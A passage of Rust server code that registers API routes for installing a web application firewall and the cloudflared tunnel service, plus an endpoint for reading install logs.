         .route("/api/services/install/waf", post(system::install_waf))
         .route("/api/services/install/cloudflared", post(system::install_cloudflared))
         .route("/api/services/install/{install_id}/log", get(system::install_log))
